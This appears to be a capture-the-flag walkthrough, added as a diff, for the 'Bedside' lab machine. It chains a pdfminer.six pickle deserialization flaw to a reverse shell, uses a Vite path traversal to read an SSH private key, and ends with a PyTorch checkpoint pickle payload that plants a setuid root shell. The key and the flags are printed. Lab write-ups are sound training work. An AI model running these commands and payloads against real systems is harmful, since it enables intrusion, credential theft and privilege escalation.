@@ -1,0 +1,225 @@
+# Bedside HTB - Complete Writeup (CVE-2025-64512 → Root)
+
+## 1. Initial Enumeration
+
+```bash
+nmap -sC -sV 10.129.35.240
+```
+
+**Findings:**
+- Port 22: SSH (OpenSSH 10.0p2)
+- Port 80: HTTP (Apache 2.4.68) → redirects to `bedside.htb`
+- Port 3000: filtered
+
+```bash
+echo "10.129.35.240 bedside.htb" | sudo tee -a /etc/hosts
+```
+
+## 2. Subdomain Discovery
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
+     -u http://bedside.htb \
+     -H "Host: FUZZ.bedside.htb" \
+     -fc 301
+```
+
+**Finding:** `research.bedside.htb` returns 200 OK
+
+```bash
+echo "10.129.35.240 research.bedside.htb" | sudo tee -a /etc/hosts
+```
+
+## 3. Research Portal Analysis
+
+Visiting `http://research.bedside.htb/` reveals:
+- A file upload portal for medical images/research
+- Accepts: jpeg, jpg, png, bmp, tiff, dcm, pdf, gz, zip
+- **Critical Header:** `X-Powered-By: pdfminer.six`
+- PDFs are "converted to standardized formats"
+
+## 4. Vulnerability Identification
+
+**CVE-2025-64512** is a critical pickle deserialization vulnerability in pdfminer.six's CMap loader.
+
+**Attack Chain:**
+1. PDF watcher process monitors uploads directory
+2. Processes PDFs with `pdf2txt.py`
+3. Triggers vulnerable CMap parser
+4. Deserializes attacker-controlled pickle payload
+5. RCE as `datawrangler` user
+
+## 5. Foothold Exploitation (Datawrangler)
+
+Use the automated exploit script:
+
+```bash
+python3 exploit.py 10.129.35.240 -L 10.10.14.39:9001
+```
+
+The script:
+- Creates malicious pickle payload (reverse shell)
+- Uploads as `.pickle.gz`
+- Creates malicious PDF referencing the pickle via crafted CMap path
+- PDF watcher processes → loads CMap → deserializes pickle → RCE
+
+**Result:** Reverse shell as `datawrangler@data-wrangler:/app$`
+
+### Key Container Files
+- `/app/pdf_watcher.py` - The PDF processing daemon
+- `/var/www/research.bedside.htb/uploads/` - Upload directory (shared mount)
+- `/datastore/` - Shared storage (checkpoints, staging, processed images)
+
+---
+
+## 6. Lateral Movement: Datawrangler → Developer (LFI via Vite)
+
+From the datawrangler shell, discovered an internal Vite dev server on `172.17.0.1:3000` serving an image viewer app.
+
+### Vite Path Traversal Exploitation
+
+The Vite dev server is vulnerable to path traversal. Standard `/@fs/` paths fail, but using `--path-as-is` curl flag bypasses path normalization:
+
+```bash
+curl --path-as-is http://localhost:3000/../../../../home/developer/.ssh/id_rsa
+```
+
+**Output:**
+```
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
+SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
+AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
+RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
+-----END OPENSSH PRIVATE KEY-----
+```
+
+### SSH as Developer
+
+From your attack box:
+
+```bash
+cat > dev_key << 'EOF'
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
+SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
+AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
+RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
+-----END OPENSSH PRIVATE KEY-----
+EOF
+
+chmod 600 dev_key
+ssh -i dev_key developer@10.129.35.240
+```
+
+**Result:** Shell as `developer@bedside:~$`
+
+**User Flag:** `2b942951932eed7134cabc40cd5802f0`
+
+---
+
+## 7. Privilege Escalation: Developer → Root (Torch Pickle RCE)
+
+The `developer` user has passwordless sudo access to run `/opt/trainer/bedside_trainer.py`:
+
+```bash
+sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py
+```
+
+This trainer script loads PyTorch model checkpoints from `/datastore/checkpoints/` and processes images from `/datastore/processed/`.
+
+### Key Discovery: Image Loading Requirement
+
+The trainer crashes if valid images don't exist in `/datastore/processed/`. The exploit chain requires:
+1. **Valid PNG in `/datastore/processed/`** (so trainer doesn't crash during image loading)
+2. **Malicious pickle in `/datastore/checkpoints/`** (loaded after images)
+
+### Pickle RCE Payload
+
+From the developer shell, create a malicious checkpoint:
+
+```bash
+python3 -c 'import torch,os;E=type("E",(),{"__reduce__":lambda s:(os.system,("cp /bin/bash /usr/local/bin/rootbash;chmod 4755 /usr/local/bin/rootbash",))});torch.save(E(),"root.pt")'
+```
+
+Package and upload it:
+
+```bash
+python3 -c "import zipfile;z=zipfile.ZipFile('root.zip','w');z.write('root.pt');z.close()"
+curl -s -F 'uploadFile=@root.zip;type=application/zip' http://research.bedside.htb/ >/dev/null
+```
+
+### Stage the Checkpoint
+
+From the datawrangler container (or via the shared `/datastore` mount):
+
+```bash
+python3 -c "import zipfile;zipfile.ZipFile('/var/www/research.bedside.htb/uploads/root.zip').extract('root.pt','/datastore/checkpoints')"
+```
+
+### Create Valid Image
+
+The trainer requires valid image files to load. Create one:
+
+```bash
+echo iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII= | base64 -d >/datastore/processed/x.png
+```
+
+### Trigger Exploitation
+
+From the developer shell, run the trainer which will:
+1. Load valid images from `/datastore/processed/`
+2. Load malicious checkpoint from `/datastore/checkpoints/`
+3. Deserialize pickle → `__reduce__` executes → RCE
+
+```bash
+sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py >/dev/null 2>&1
+```
+
+### Get Root Shell
+
+The RCE created `/usr/local/bin/rootbash` with setuid bit. Use it to escalate:
+
+```bash
+/usr/local/bin/rootbash -p -c 'id;cat /root/root.txt'
+```
+
+**Output:**
+```
+uid=1000(developer) gid=1000(developer) euid=0(root) groups=1000(developer),100(users)
+152de8dbff33e85b7994da398f602e60
+```
+
+Or get an interactive root shell:
+
+```bash
+/usr/local/bin/rootbash -p
+```
+
+---
+
+## Root Flag
+
+```
+152de8dbff33e85b7994da398f602e60
+```
+
+---
+
+## Summary of Vulnerabilities
+
+| Vulnerability | Component | Impact |
+|---|---|---|
+| CVE-2025-64512 | pdfminer.six CMap parser | RCE as datawrangler |
+| Path Traversal | Vite dev server `--path-as-is` | Read developer's SSH key |
+| Pickle Deserialization | PyTorch checkpoint loading | RCE as developer (sudo) → root |
+
+## Key Insight
+
+The exploit chain required understanding the **multi-container architecture**:
+- `datawrangler` container has shared `/datastore` mount
+- `developer` container has Vite dev server with LFI
+- Both containers access the same uploaded files and checkpoints
+- Staging a malicious checkpoint in `/datastore/checkpoints/` and a valid image in `/datastore/processed/` allows the trainer to load and deserialize the payload with sudo privileges
